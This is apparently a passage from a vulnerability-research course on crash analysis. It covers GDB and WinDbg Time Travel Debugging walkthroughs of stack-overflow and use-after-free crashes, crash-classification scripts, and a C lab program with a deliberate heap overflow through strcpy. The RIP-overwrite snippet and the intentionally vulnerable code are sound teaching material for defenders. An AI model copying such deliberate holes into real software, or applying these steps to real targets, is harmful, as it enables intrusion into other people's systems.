p = process(["./vuln_no_protect", "1", b"A"*72 + p64(0xdeadbeefcafebabe)])
p.wait()
EOF

# In GDB, confirm RIP = 0xdeadbeefcafebabe (use the correct crash file)
gdb ./vuln_no_protect -c /var/crash/core.vuln_no_protect.3552.1766237600
pwndbg> info reg rip
# rip  0xdeadbeefcafebabe   <-- We control RIP!
```

> [!NOTE]
> The offset (72 in this example) is the number of bytes from the start of your input to the saved return address.
> In Week 5, you'll replace `0xdeadbeefcafebabe` with actual exploit targets (ROP gadgets, shellcode addresses, etc.).

### Time Travel Debugging (TTD)

**What Is TTD?**:

- Time Travel Debugging (TTD) is Microsoft's revolutionary debugging technology that records program execution and allows stepping backward in time.
- Unlike traditional debugging where you can only step forward, TTD captures the entire execution trace, enabling you to navigate to any point in the program's history.

**Why TTD Matters for Crash Analysis**:

- **No More "Oops, I stepped too far"**: Step backward to inspect the exact state before a crash
- **Perfect Reproducibility**: Recorded traces can be replayed indefinitely with identical behavior
- **Non-deterministic Bug Analysis**: Catches race conditions, timing issues, and heisenbug patterns
- **Offline Analysis**: Record on one machine, analyze on another
- **Root Cause Discovery**: Trace backward from crash to find where corruption originated

**Example TTD Workflow with vuln_win.exe**:

This example uses the stack overflow crash from our test suite:

```bash
# Record the crash (if not already done)
# In WinDbg Preview: File → Start debugging → Launch executable (advanced)
# Executable: C:\CrashAnalysisLab\vuln_win.exe
# Arguments: 1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Check "Record with Time Travel Debugging"
# Click "Record"
# Program crashes, trace saved automatically
# Note: After recording completes, WinDbg loads the trace at position A:0
# (the beginning), NOT at the crash point. You'll see ntdll!LdrInitializeThunk
# in the call stack - this is normal. Use 'g' or '!tt 100' to reach the crash.
0:000> g

# Initial analysis - we're at the crash point (Access violation at 0x4141414141414141)
0:000> k
# Shows call stack at crash - completely corrupted with 0x41414141`41414141
# 00 ntdll!NtRaiseException+0x14
# 01 ntdll!KiUserExceptionDispatch+0x53
# 02 0x41414141`41414141    <- Attempted to execute here!
# 03 0x41414141`41414141    <- Stack smashed with 'AAAAAAAA'
# ... (more 0x41414141`41414141 entries)

0:000> r
# Note: RIP won't show 0x4141414141414141 directly - it points to the
# exception handler (ntdll!NtRaiseException). The crash happened when
# the CPU tried to execute at the corrupted address. Evidence is in the
# call stack above showing the attempted return to 0x41414141`41414141.

# Jump to beginning of trace
0:000> !tt 0
# Now at program start

# Set breakpoint at vulnerable function
0:000> bp vuln_win!stack_overflow
0:000> g
# Breakpoint hit at start of stack_overflow()

# Examine state before overflow
0:000> r
0:000> dps @rsp L10
# Stack looks normal, return address intact

# Step through the function
0:000> p
0:000> p
0:000> p
0:000> p
# At 'add rsp,68h' - about to return
0:000> p
# Crash! Now at 0x41414141`41414141

# Step 8: Use TTD to examine the crash point
# Note: p- steps back to previous "step boundary" (breakpoints, calls),
# not single instructions. To examine state just before crash, use !tt
# with the position shown before the crash:
0:000> !tt 5C:110
# Now at 'add rsp,68h' just before the corrupted ret

# Step 9: Examine the corrupted stack before ret executes
0:000> dps @rsp L10
# Return address at rsp now contains 0x4141414141414141!
# Compare to earlier - the strcpy overwrote the saved return address

# Alternative: p- goes back to step boundaries, not single instructions
0:000> p-
# Goes back to breakpoint at stack_overflow entry (clean stack state)

# Continue to crash
0:000> g
# Crash occurs when function returns to 0x4141414141414141

# Go backward from crash to find corruption point
0:000> g-
# Stops at previous breakpoint - we can examine state just before crash
```

**TTD Data Model Queries**:

TTD integrates with WinDbg's data model, enabling powerful queries:

**Memory Access Queries**:

```bash
# Find all memory writes to the return address location
# First, get RSP at function entry to know where return address is stored
0:000> !tt 0
0:000> bp vuln_win!stack_overflow
0:000> g
0:000> r rsp
# rsp=000000000014fed8  # Return address stored here

# Find all writes to this address range
0:000> dx @$cursession.TTD.Memory(0x14fed8, 0x14fee0, "w")
# Returns many entries - each write to this memory region

# Get details of the LAST write (the one that corrupted return address)
0:000> dx @$cursession.TTD.Memory(0x14fed8, 0x14fee0, "w").Last()
# EventType        : 0x1
# TimeStart        : 59:1A7 [Time Travel]
# AccessType       : Write
# IP               : 0x140083412
# Address          : 0x14fedd
# Size             : 0x8
# Value            : 0x4141414141414141      <- The overflow!
# OverwrittenValue : 0xa3d5d3000000          <- Original value destroyed

# Navigate to the exact instruction that corrupted the return address
0:000> dx @$cursession.TTD.Memory(0x14fed8, 0x14fee0, "w").Last().TimeStart.SeekTo()
0:000> u @rip L3
# vuln_win!__entry_from_strcat_in_strcpy+0x1f:
# 00000001`40083412 4889040a        mov     qword ptr [rdx+rcx],rax  <- strcpy writing 'AAAAAAAA'
```

**Call Queries**:

```bash
# Find all calls to strcpy
0:000> dx @$cursession.TTD.Calls("vuln_win!strcpy")
# [0x0]  <- One call found

# Find all strcpy-related functions (includes internal helpers)
0:000> dx @$cursession.TTD.Calls("vuln_win!*strcpy*")
# Returns multiple entries for strcpy and its internal routines

# Find calls to stack_overflow with full details
0:000> dx @$cursession.TTD.Calls("vuln_win!stack_overflow")[0]
# EventType        : 0x0
# TimeStart        : 55:5AA [Time Travel]
# TimeEnd          : Max Position [Time Travel]  <- Never returned (crashed)
# Function         : vuln_win!stack_overflow
# ReturnAddress    : 0x14000789d
# Parameters       : [expand to see function arguments]

# View function parameters - shows the malicious input!
0:000> dx @$cursession.TTD.Calls("vuln_win!stack_overflow")[0].Parameters
# input : 0xa3d5d3 : "AAAAAAAAAA..." [Type: char *]

# Navigate to specific call
0:000> dx @$cursession.TTD.Calls("vuln_win!stack_overflow")[0].TimeStart.SeekTo()
# Now at the start of stack_overflow() - can step through
```

**Example: Finding Where Return Address Was Overwritten**:

```bash
# The key insight: use TTD.Memory() to find who wrote to the return address

# Step 1: Find where return address is stored
0:000> !tt 0
0:000> bp vuln_win!stack_overflow
0:000> g
0:000> r rsp
# rsp=000000000014fed8  # Return address at this location

# Step 2: Query all writes to return address location
0:000> dx @$cursession.TTD.Memory(0x14fed8, 0x14fee0, "w").Last()
# Value: 0x4141414141414141 - confirms overflow wrote here
# IP: 0x140083412 - instruction that did the write

# Step 3: Navigate to the corruption point
0:000> dx @$cursession.TTD.Memory(0x14fed8, 0x14fee0, "w").Last().TimeStart.SeekTo()

# Step 4: Examine the guilty instruction
0:000> u @rip L1
# vuln_win!__entry_from_strcat_in_strcpy+0x1f:
# mov     qword ptr [rdx+rcx],rax  # strcpy's copy loop overwrote return address!

# Step 5: Check registers to see the overflow in action
0:000> r rax
# rax=4141414141414141  # Source data being copied
```

**Example: Tracing User Input Through vuln_win.exe**:

```bash
# Goal: Trace how command-line input flows to the crash

# Step 1: Find and navigate to main()
0:000> dx @$cursession.TTD.Calls("vuln_win!main")[0]
# TimeStart        : 55:4D6 [Time Travel]
# ReturnValue      : 0 [Type: int]
# Parameters       : [contains argc, argv]

0:000> dx @$cursession.TTD.Calls("vuln_win!main")[0].TimeStart.SeekTo()

# Step 2: Examine argv (RDX = argv in Windows x64 calling convention)
0:000> dps @rdx L4
# 00000000`00a3d590  00000000`00a3d5b0  # argv[0] - program name
# 00000000`00a3d598  00000000`00a3d5d1  # argv[1] - "1" (test number)
# 00000000`00a3d5a0  00000000`00a3d5d3  # argv[2] - overflow input
# 00000000`00a3d5a8  00000000`00000000  # NULL terminator

# Step 3: View the malicious input
0:000> da poi(@rdx+0x10)
# 00000000`00a3d5d3  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
# 00000000`00a3d5f3  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
...

# Step 4: See how input reaches vulnerable function
0:000> dx @$cursession.TTD.Calls("vuln_win!stack_overflow")[0].Parameters
# input : 0xa3d5d3 : "AAAAAAAAAA..." [Type: char *]
# Same address as argv[2] - input passed directly to vulnerable function!

# Step 5: Find all reads from the input buffer to trace data flow
0:000> dx @$cursession.TTD.Memory(0xa3d5d3, 0xa3d5d3+0x100, "r")
# Shows every instruction that read from the malicious input
```

**Practical TTD Crash Analysis: Use-After-Free in vuln_win.exe**:

This example demonstrates TTD's power for analyzing UAF bugs:

```bash
# Step 1: Enable PageHeap for reliable UAF detection (run as admin)
"C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\gflags.exe" /p /enable vuln_win.exe /full

# Step 2: Record UAF crash with TTD
# In WinDbg Preview: File → Start debugging → Launch executable (advanced)
# Executable: C:\CrashAnalysisLab\vuln_win.exe
# Arguments: 3
# Check "Record with Time Travel Debugging"
# Click "Record"

# Step 3: Run to the crash
0:000> g
# (24c4.2178): Access violation - code c0000005 (first/second chance not available)
# Time Travel Position: 379:0
# vuln_win!strnlen+0x84:
# 00000001`4005c464 vpcmpeqb ymm1,ymm1,ymmword ptr [rdx] ds:00000000`02393fc0=48

# Step 4: Analyze the crash
0:000> k
# Call stack shows:
# vuln_win!strnlen+0x84           <- Crash here, reading freed memory
# vuln_win!printf+0x41            <- printf trying to print the string
# vuln_win!use_after_free+0x7a    <- Our vulnerable function
# vuln_win!main+0xe6

0:000> !analyze -v
# Key findings:
# READ_ADDRESS: 0000000002393fc0   <- Attempting to read freed memory
# Failure.Bucket: INVALID_POINTER_READ_AVRF_c0000005_vuln_win.exe!strnlen

# Step 5: Find all heap frees and identify the one matching crash address
0:000> dx @$cursession.TTD.Calls("ntdll!RtlFreeHeap")
# [0x0], [0x1], [0x2]  <- Three frees in the trace

0:000> dx @$cursession.TTD.Calls("ntdll!RtlFreeHeap")[2].Parameters
# [0x0] : 0x2080000      <- HeapHandle
# [0x1] : 0x0            <- Flags
# [0x2] : 0x2393fc0      <- BaseAddress - MATCHES CRASH ADDRESS!

# Step 6: Get details on the free and navigate to it
0:000> dx @$cursession.TTD.Calls("ntdll!RtlFreeHeap")[2]
# TimeStart        : 373:118 [Time Travel]
# ReturnAddress    : 0x14000753d
# ReturnValue      : 0x1  <- Free succeeded

0:000> dx @$cursession.TTD.Calls("ntdll!RtlFreeHeap")[2].TimeStart.SeekTo()
0:000> k
# 00 ntdll!RtlFreeHeap
# 01 vuln_win!use_after_free+0x5d  <- free() called here (line 27)
# 02 vuln_win!main+0xe6

# Step 7: Navigate to use_after_free function entry
0:000> dx @$cursession.TTD.Calls("vuln_win!use_after_free")[0]
# TimeStart : 366:1218    <- Function entry
# TimeEnd   : Max Position <- Never returned (crashed)

0:000> dx @$cursession.TTD.Calls("vuln_win!use_after_free")[0].TimeStart.SeekTo()
0:000> k
# Now at the start of use_after_free()

# Step 8: Examine the freed memory at crash point
0:000> !tt 379:0
0:000> !address 0x2393fc0
# "Address could not be mapped" - PageHeap unmapped the page after free!

0:000> dc 0x2393fc0 L10
# 02393fc0  6c6c6548 57202c6f 646c726f c0c00021  Hello, World!...
# 02393fd0  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0  ................
# The string data is still there, but 0xc0 fill pattern shows it's freed!

# Timeline Summary:
# Position 366:1218 - use_after_free() called
# Position 373:118  - free(ptr) called, memory freed
# Position 379:0    - printf(ptr) crashes trying to read freed memory

# Step 9: Don't forget to disable PageHeap after analysis
# "C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\gflags.exe" /p /disable vuln_win.exe
```

**TTD Best Practices**:

1. **Record Minimal Scope**: Only record the crashing process to keep traces manageable
2. **Use Breakpoints Wisely**: Set breakpoints before recording to stop at interesting points
3. **Leverage Data Model**: TTD queries are more powerful than manual navigation
4. **Save Interesting Positions**: Use `!positions` to bookmark important execution points
5. **Combine with Memory Analysis**: Use TTD to find when corruption occurred, traditional commands to analyze it
6. **Enable PageHeap for Heap Bugs**: TTD + PageHeap gives you allocation/free stacks AND time travel

**TTD Limitations**:

- **Trace Size**: Long-running processes create large trace files (GBs)
- **Performance**: Recording adds ~10-20x slowdown
- **Windows Only**: No Linux equivalent (use rr instead - see Day 4)
- **No Kernel Mode**: TTD is user-mode only
- **x64 Only**: No 32-bit support in modern versions
- **WinDbg Preview Required**: Classic WinDbg from Windows SDK doesn't include TTD

### Black-Box Crash Analysis

> [!IMPORTANT]
> In real-world vulnerability research, especially on Windows, you rarely have source code.
> The sanitizer-based techniques in Day 2 require recompilation. This section covers black-box techniques for when you can't recompile.

**When to Use Black-Box Analysis**:

- Analyzing crashes in closed-source software (Microsoft, Adobe, etc.)
- Third-party libraries shipped as binaries
- Malware analysis
- CTF challenges without source
- Production crash dumps from customers

**Setup: Creating a Symbol-less Binary for Practice**:

```bash
# Compile without debug symbols to simulate closed-source binary
cl /O2 /GS- src\vulnerable_suite_win.c /Fe:vuln_win_nosym.exe

# Record crash with TTD
# WinDbg Preview: File → Start debugging → Launch executable (advanced)
# Executable: C:\CrashAnalysisLab\vuln_win_nosym.exe
# Arguments: 1 AAAA...(200+ chars)
# Check "Record with Time Travel Debugging"
```

#### Manual Crash State Analysis

**Initial Crash Assessment**:

```bash
# After crash, examine the state
0:000> g
# (2194.20e0): Access violation - code c0000005
# Time Travel Position: 61:0
# 41414141`41414141 ??              ???

# RIP is completely controlled - classic stack overflow!
0:000> r
# rip=4141414141414141  # Controlled!
# rbx=4141414141414141  # Also controlled
# rdi=4141414141414141  # Also controlled
# rsp=000000398bb0fe30

# Call stack is destroyed - all 0x41414141
0:000> k
# 00 0x41414141`41414141
# 01 0x41414141`41414141
# 02 0x41414141`41414141
# ...
```

**When RIP is Invalid - Use TTD to Go Back**:

```bash
# Can't disassemble at invalid RIP
0:000> u @rip-20 L30
# ^ Memory access error  # Expected - RIP points to garbage

# Use TTD to find last valid state (position before crash)
0:000> !tt 60:0
0:000> k
# Now we see the real call stack with module offsets:
# 00 ntdll!NtWriteFile+0x14
# 01 KERNELBASE!WriteFile+0x8d
# 02 vuln_win_nosym+0xf186      <- CRT printf internals
# ...
# 0a vuln_win_nosym+0x146b      <- Caller
# 0b vuln_win_nosym+0x1098      <- Vulnerable function (returns to 0x41414141)
```

**Module and Section Analysis**:

```bash
# List loaded modules
0:000> lm
# start             end                 module name
# 00007ff7`73770000 00007ff7`73798000   vuln_win_nosym   (no symbols)
# 00007ff9`179e0000 00007ff9`17c47000   ntdll      (pdb symbols)

# Get PE header info - entry point, sections
0:000> !dh vuln_win_nosym
#    8664 machine (X64)
#     1000 base of code
#     16D4 address of entry point    <- Entry point offset
#    15200 size of code
#    17000 [     240] address [size] of Import Address Table

# Check exception directory for function boundaries
0:000> .fnent vuln_win_nosym+0x1010
#  BeginAddress      = 00000000`00001010
#  EndAddress        = 00000000`000012a3   <- Function spans 0x1010-0x12a3
#  UnwindInfoAddress = 00000000`0002003c
```

**Reverse Engineering the Vulnerable Function**:

```bash
# Disassemble the function that crashed (identified from call stack)
0:000> u vuln_win_nosym+0x1010 L50

# Look for function prologue
vuln_win_nosym+0x1010:
# mov     qword ptr [rsp+10h],rbx    # Save rbx
# push    rdi                         # Save rdi
# sub     rsp,60h                     # Allocate 0x60 bytes stack frame

# Find the vulnerable call - look for string copy patterns
# vuln_win_nosym+0x1071:
# lea     rcx,[rsp+20h]              # Destination: stack buffer at rsp+0x20
# vuln_win_nosym+0x1076:
# call    vuln_win_nosym+0x15b90     # <- This is strcpy!

# Function epilogue shows where crash happens
# vuln_win_nosym+0x1098:
# xor     eax,eax
# mov     rbx,qword ptr [rsp+78h]
# add     rsp,60h
# pop     rdi
# ret                                 # <- Returns to corrupted address!
```

**Identifying Library Functions Without Symbols**:

```bash
# Dump Import Address Table to identify API calls
0:000> dps vuln_win_nosym+0x17000 L20
# 00007ff7`73787000  ntdll!RtlAllocateHeap
# 00007ff7`73787008  KERNEL32!HeapFreeStub
# 00007ff7`73787010  KERNEL32!GetProcessHeap
# 00007ff7`737870d8  KERNEL32!GetStdHandleStub
# 00007ff7`737870e0  KERNEL32!WriteFile

# Identify strcpy by its implementation pattern
0:000> u vuln_win_nosym+0x15b90 L15
# Byte-by-byte copy loop with null check = strcpy
# mov     r11,rcx           # Save dest
# sub     rcx,rdx           # Calculate offset
# mov     al,byte ptr [rdx] # Load source byte
# mov     byte ptr [rdx+rcx],al  # Store to dest
# test    al,al             # Check for null
# je      <end>             # Exit if null
# inc     rdx               # Next byte
# ...
```

**String Search for Context Clues**:

```bash
# Search for interesting strings in the binary
0:000> s -a vuln_win_nosym L28000 "overflow"
# 00007ff7`7378741c  "overflow detected! alloc_size=%u."
# 00007ff7`737874dd  "overflow (need ~100+ chars)."

# View the strings
0:000> da 00007ff7`7378741c
# "overflow detected! alloc_size=%u."

# Search for function names, error messages
0:000> s -a vuln_win_nosym L28000 "Test"
# 00007ff7`73787473  "Test Suite."

0:000> s -a vuln_win_nosym L28000 "free"
# 00007ff7`737873f2  "free done."
```

**Pattern Recognition Without Symbols**:

```bash
# 1. Stack Overflow Pattern (what we found):
# - RIP contains controlled data (0x41414141...)
# - Stack filled with repeating pattern
# - Function epilogue (add rsp, XX / ret) leads to crash

# 2. Heap Corruption Pattern:
# - Crash in ntdll!Rtl*Heap* functions
# - Invalid forward/backward pointers
# - Corrupted heap metadata

# 3. Use-After-Free Pattern:
# - Crash reading/writing freed memory
# - PageHeap shows 0xc0c0c0c0 fill pattern
# - !address shows "could not be mapped"

# 4. Type Confusion Pattern:
# - Valid object pointer
# - Wrong vtable being used
# - Field access at unexpected offset
```

#### WinDbg Scripting for Black-Box Analysis

**Automated Crash Classification Script**:

```javascript
// crash_classify.js - Save to C:\CrashAnalysisLab\crash_classify.js
// Run with: .scriptrun C:\CrashAnalysisLab\crash_classify.js

"use strict";

function initializeScript() {
  return [new host.apiVersionSupport(1, 7)];
}

function invokeScript() {
  var dbgControl = host.namespace.Debugger.Utility.Control;
  var regs = host.currentThread.Registers.User;

  host.diagnostics.debugLog("=== BLACK-BOX CRASH ANALYSIS ===\n\n");

  // Get exception record
  host.diagnostics.debugLog("[*] Exception Record:\n");
  try {
    var exrOutput = dbgControl.ExecuteCommand(".exr -1");
    for (var line of exrOutput) {
      host.diagnostics.debugLog("    " + line + "\n");
    }
  } catch (e) {
    host.diagnostics.debugLog("    Could not get exception record\n");
  }

  // Check RIP validity and controlled input patterns
  host.diagnostics.debugLog("\n[*] Register Analysis:\n");

  var patterns = {
    41414141: "ASCII 'AAAA' - controlled input!",
    42424242: "ASCII 'BBBB' - controlled input!",
    43434343: "ASCII 'CCCC' - controlled input!",
    cccccccc: "Uninitialized stack (MSVC debug)",
    cdcdcdcd: "Uninitialized heap (MSVC debug)",
    c0c0c0c0: "PageHeap freed memory",
    feeefeee: "Freed heap memory (MSVC debug)",
    baadf00d: "Uninitialized heap (LocalAlloc)",
    deadbeef: "Marker value (test/exploit)",
  };

  var criticalRegs = ["Rip", "Rax", "Rbx", "Rcx", "Rdx", "Rsi", "Rdi", "Rsp"];
  var ripControlled = false;

  for (var i = 0; i < criticalRegs.length; i++) {
    var regName = criticalRegs[i];
    try {
      var regVal = regs[regName];
      var val = regVal.toString(16);
      // Pad to 16 chars
      while (val.length < 16) {
        val = "0" + val;
      }
      var analysis = "";

      for (var pattern in patterns) {
        if (val.toLowerCase().indexOf(pattern) !== -1) {
          analysis = " <- " + patterns[pattern];
          if (regName === "Rip") {
            ripControlled = true;
          }
          break;
        }
      }

      host.diagnostics.debugLog(
        "    " + regName + ": 0x" + val + analysis + "\n",
      );
    } catch (e) {
      host.diagnostics.debugLog("    " + regName + ": <error reading>\n");
    }
  }

  // Exploitability assessment
  host.diagnostics.debugLog("\n[*] Exploitability Assessment:\n");

  if (ripControlled) {
    host.diagnostics.debugLog(
      "    [CRITICAL] RIP contains controlled pattern - EXPLOITABLE!\n",
    );
    host.diagnostics.debugLog(
      "    Stack overflow with RIP control detected.\n",
    );
  } else {
    // Try to disassemble at RIP
    try {
      var uOutput = dbgControl.ExecuteCommand("u @rip L1");
      var instruction = "";
      for (var line of uOutput) {
        instruction += line + " ";
      }

      if (instruction.indexOf("???") !== -1) {
        host.diagnostics.debugLog(
          "    [HIGH] Invalid instruction at RIP - likely controlled\n",
        );
      } else if (
        instruction.indexOf("mov") !== -1 &&
        instruction.indexOf("[") !== -1
      ) {
        host.diagnostics.debugLog(
          "    [HIGH] Crash on memory access - potential read/write primitive\n",
        );
      } else if (
        instruction.indexOf("call") !== -1 &&
        instruction.indexOf("[") !== -1
      ) {
        host.diagnostics.debugLog(
          "    [HIGH] Crash on indirect call - potential code execution\n",
        );
      } else {
        host.diagnostics.debugLog(
          "    [MEDIUM] Examine crash context for exploitability\n",
        );
      }
    } catch (e) {
      host.diagnostics.debugLog(
        "    [HIGH] Cannot disassemble at RIP - address likely controlled\n",
      );
    }
  }

  // Stack analysis for return addresses
  host.diagnostics.debugLog("\n[*] Stack Analysis (valid return addresses):\n");
  try {
    var stackOutput = dbgControl.ExecuteCommand("dps @rsp L20");
    var validAddrs = 0;
    var controlledAddrs = 0;

    for (var line of stackOutput) {
      var lineStr = line.toString();
      if (
        lineStr.indexOf("41414141") !== -1 ||
        lineStr.indexOf("42424242") !== -1
      ) {
        controlledAddrs++;
      }
      if (lineStr.indexOf("!") !== -1) {
        validAddrs++;
        host.diagnostics.debugLog("    " + lineStr + "\n");
      }
    }

    host.diagnostics.debugLog(
      "\n    Valid return addresses: " + validAddrs + "\n",
    );
    host.diagnostics.debugLog(
      "    Controlled values on stack: " + controlledAddrs + "\n",
    );
  } catch (e) {
    host.diagnostics.debugLog("    <error reading stack>\n");
  }

  host.diagnostics.debugLog("\n=== END ANALYSIS ===\n");
}
```

**Usage**:

```bash
# First go to the crash point
0:000> g
# Or for TTD traces, go to crash position
# 0:000> !tt 61:0

# Run the analysis script (uses invokeScript automatically)
0:000> .scriptrun C:\CrashAnalysisLab\crash_classify.js
#JavaScript script successfully loaded from 'C:\CrashAnalysisLab\crash_classify.js'
#=== BLACK-BOX CRASH ANALYSIS ===
#
#[*] Exception Record:
#    ExceptionAddress: 4141414141414141
#       ExceptionCode: c0000005 (Access violation)
#      ExceptionFlags: 00000000
#    NumberParameters: 2
#       Parameter[0]: 0000000000000000
#       Parameter[1]: 0000414141414141
#    Attempt to read from address 0000414141414141
#[*] Register Analysis:
#    Rip: <error reading>
#    Rax: <error reading>
#    Rbx: <error reading>
#    Rcx: <error reading>
#    Rdx: <error reading>
#    Rsi: <error reading>
#    Rdi: <error reading>
#    Rsp: <error reading>
#[*] Exploitability Assessment:
#    [HIGH] Cannot disassemble at RIP - address likely controlled
#[*] Stack Analysis (valid return addresses):
#    00000039`8bb0feb8  00007ff9`17a6c510 ntdll!RtlUserThreadStart
#    Valid return addresses: 1
#    Controlled values on stack: 16
#=== END ANALYSIS ===
```

**Quick Black-Box Analysis Commands**:

```bash
# List modules (identify target binary without symbols)
0:000> lm
# start             end                 module name
# 00007ff7`73770000 00007ff7`73798000   vuln_win_nosym (no symbols)
# 00007ff9`179e0000 00007ff9`17c47000   ntdll      (pdb symbols)

# Get exception details
0:000> .exr -1
# ExceptionAddress: 4141414141414141
# ExceptionCode: c0000005 (Access violation)

# Check all registers
0:000> r

# Short call stack - shows controlled return addresses
0:000> k 5
# 00 0x41414141`41414141
# 01 0x41414141`41414141
# ... (all corrupted)

# Check stack for controlled values - classic overflow pattern
0:000> dps @rsp L30
# 00000039`8bb0fe30  41414141`41414141   <- Controlled!
# 00000039`8bb0fe38  41414141`41414141
# ... (16 entries of 0x41414141)
# 00000039`8bb0feb8  00007ff9`17a6c510 ntdll!RtlUserThreadStart  <- Only valid addr

# Search binary for strings (clues about functionality)
0:000> s -a vuln_win_nosym L28000 "overflow"
# 00007ff7`7378741c  "overflow detected..."
# 00007ff7`737874dd  "overflow (need ~100+ chars)..."
```

**GDB/Pwndbg Black-Box Script**:

```python
# blackbox_analyze.py - Source this in GDB: source blackbox_analyze.py
import gdb

class BlackBoxAnalyze(gdb.Command):
    """Analyze crash without symbols"""

    def __init__(self):
        super(BlackBoxAnalyze, self).__init__("bb-analyze", gdb.COMMAND_USER)

    def invoke(self, arg, from_tty):
        print("=== BLACK-BOX CRASH ANALYSIS ===\n")

        # Get exception record
        try:
            pc = int(gdb.parse_and_eval("$pc"))
            print(f"[*] Crash at: {hex(pc)}")
        except:
            print("[-] Could not get program counter")
            return

        # Check instruction at crash
        print("\n[*] Crash Instruction:")
        try:
            gdb.execute(f"x/10i {pc-20}")
        except gdb.MemoryError:
            print(f"    Cannot disassemble at {hex(pc)} - address not mapped")
            print("    (PC likely contains attacker-controlled value)")

        # Register analysis
        print("\n[*] Register Analysis:")
        controlled_patterns = [0x41414141, 0x42424242, 0x61616161]

        for reg in ["rax", "rbx", "rcx", "rdx", "rsi", "rdi", "r8", "r9"]:
            try:
                val = int(gdb.parse_and_eval(f"${reg}"))
                analysis = ""

                # Check for controlled input
                for pattern in controlled_patterns:
                    if (val & 0xffffffff) == pattern or (val >> 32) == pattern:
                        analysis = " <- CONTROLLED INPUT!"
                        break

                # Check for null
                if val == 0:
                    analysis = " <- NULL"

                # Check for heap-like address
                if 0x10000 < val < 0x800000000000:
                    analysis = analysis or " <- possible heap/data"

                print(f"    {reg}: {hex(val)}{analysis}")
            except:
                pass

        # Stack analysis
        print("\n[*] Stack Contents (potential return addresses):")
        try:
            gdb.execute("x/20gx $rsp")
        except:
            gdb.execute("x/20wx $esp")

        # Exploitability hints
        print("\n[*] Exploitability Assessment:")

        # Check if PC is controlled
        pc_controlled = False
        for pattern in controlled_patterns:
            if (pc & 0xffffffff) == pattern or (pc >> 32) == pattern:
                print("    [CRITICAL] Program counter contains controlled input!")
                pc_controlled = True
                break

        # Check for common exploit marker patterns
        marker_patterns = {
            0xdeadbeef: "DEADBEEF marker",
            0xcafebabe: "CAFEBABE marker",
            0xdeadc0de: "DEADC0DE marker",
            0xfeedface: "FEEDFACE marker",
        }
        if not pc_controlled:
            pc_lower = pc & 0xffffffff
            pc_upper = (pc >> 32) & 0xffffffff
            for pattern, name in marker_patterns.items():
                if pc_lower == pattern or pc_upper == pattern:
                    print(f"    [CRITICAL] PC contains {name} - likely controlled!")
                    pc_controlled = True
                    break

        # Check if PC is in non-executable region (indicates control)
        if not pc_controlled and pc > 0x7f0000000000:
            print("    [WARNING] PC in high memory - possible stack/heap address")
        elif not pc_controlled and pc < 0x10000:
            print("    [WARNING] PC near NULL - possible partial overwrite")
        elif not pc_controlled:
            print("    [INFO] PC not directly controlled - check for indirect paths")

BlackBoxAnalyze()
print("Black-box analysis command loaded. Use: bb-analyze")
```

### Lab: Root Cause ≠ Crash Site

**The Problem**:

- Heap corruption crashes often occur in `malloc()`/`free()` consistency checks
- The actual overflow/UAF happened earlier—sometimes thousands of instructions before
- Without understanding this, you'll waste hours staring at allocator internals

#### Lab Setup: The Delayed Corruption Bug

**vulnerable_delayed.c** - A bug where corruption and crash are separated:

```c
// ~/crash_analysis_lab/src/vulnerable_delayed.c
// The bug is in process_data(), but the crash is in cleanup()
// This version uses HEAP allocations to demonstrate delayed corruption
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct metadata {
    size_t size;
    char* data;
    struct metadata* next;
};

struct metadata* head = NULL;

void add_entry(const char* input) {
    struct metadata* entry = malloc(sizeof(struct metadata));
    entry->size = strlen(input);
    entry->data = malloc(entry->size + 1);
    strcpy(entry->data, input);
    entry->next = head;
    head = entry;
    printf("[+] Added entry at %p (data=%p, next=%p)\n", entry, entry->data, entry->next);
}

void process_data(const char* input) {
    if (head == NULL) return;

    char* buffer = malloc(16);
    printf("[*] Allocated 16-byte buffer at %p\n", buffer);
    printf("[*] About to copy %zu bytes into 16-byte buffer...\n", strlen(input));

    strcpy(buffer, input);  // OVERFLOW if input > 16 bytes!

    printf("[*] Copy complete (overflow occurred if input > 16 bytes)\n");
    // Note: we intentionally don't free buffer here to keep corruption intact
}

void cleanup() {
    printf("[*] Starting cleanup - traversing linked list...\n");
    struct metadata* current = head;
    int i = 0;
    while (current) {
        printf("[*] Entry %d: current=%p, data=%p, next=%p\n",
               i++, current, current->data, current->next);
        struct metadata* next = current->next;
        free(current->data);
        free(current);
        current = next;
    }
    printf("[*] Cleanup complete\n");
}

int main(int argc, char** argv) {
    if (argc < 2) {
        printf("Usage: %s <input>\n", argv[0]);
        printf("Example: %s $(python3 -c \"print('A'*200)\")\n", argv[0]);
        return 1;
    }

    printf("[*] Creating linked list entries...\n");
    add_entry("normal entry 1");
    add_entry("normal entry 2");

    printf("\n[*] Processing user input (%zu bytes)...\n", strlen(argv[1]));
    process_data(argv[1]);

    printf("\n[*] Adding more entries after overflow...\n");
    add_entry("post-overflow entry");

    printf("\n[*] Starting cleanup (CRASH likely here, not in process_data!)...\n");
    cleanup();

    printf("[*] Program completed successfully\n");
    return 0;
}
```

#### Exercise Part 1: Observe the Problem (Without ASAN)

```bash
# Build WITHOUT sanitizers
cd ~/crash_analysis_lab
gcc -g -fno-stack-protector -o delayed_vuln src/vulnerable_delayed.c
source .venv/bin/activate

# Trigger the bug with a LARGE overflow (200+ bytes needed to corrupt heap structures)
./delayed_vuln $(python3 -c "print('A'*200)")

# Analyze with GDB
gdb ./delayed_vuln
(gdb) run $(python3 -c "print('A'*200)")
# CRASH in free() or during list traversal

(gdb) bt
# Backtrace shows crash in add_entry() NOT in process_data() where the bug actually is!
```

**What You'll See**:

- Crash occurs in `add_entry()` or `cleanup()` - NOT in `process_data()`!
- The error message is `malloc(): corrupted top size` - heap corruption detected
- Backtrace shows allocator functions (`_int_malloc`, `malloc_printerr`, etc.)
- The actual vulnerable `strcpy()` in `process_data()` is NOT visible in the backtrace
- Signal is SIGABRT (from allocator detecting corruption)

